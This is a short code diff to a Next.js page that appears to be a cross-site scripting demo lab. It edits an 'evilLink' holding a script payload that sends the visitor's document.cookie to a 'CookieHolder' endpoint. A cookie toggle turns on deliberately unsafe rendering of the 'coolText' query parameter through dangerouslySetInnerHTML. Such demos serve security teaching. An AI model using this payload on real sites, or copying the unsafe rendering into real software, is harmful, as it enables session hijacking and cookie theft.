@@ -9,7 +9,7 @@ export default async function Home({
 }) {
     const coolText = (await searchParams).coolText
     const hostname = (await headers()).get("host")
-    const evilLink = `http://${hostname}/?coolText=<script>document.location='http://${hostname}/CookieHolder?'%2Bdocument.cookie</script>`;
+    const evilLink = `http://${hostname}/?coolText=<script>document.location='http://${hostname}/CookieHolder?cookie='%2Bdocument.cookie</script>`;
     const XSSEnabled = (await cookies()).get("XSSEnabled")?.value
     const SDEEnabled = (await cookies()).get("SDEEnabled")?.value
     const myCookie = (await cookies()).get("cookie")?.value
@@ -53,8 +53,8 @@ export default async function Home({
                     </label>
                     <button type="submit" className="ml-2 px-2 py-1 border rounded">Toggle</button>
                 </form>
-                <h1>Here goes the cool text!</h1>
-                {coolText}
+                <h1>Here goes the cool text: {coolText}</h1>
+                
                 {XSSEnabled == "enabled" && <div dangerouslySetInnerHTML={{ __html: coolText ?? ''}}></div>}
 
                 <form action={handleFormAction}>
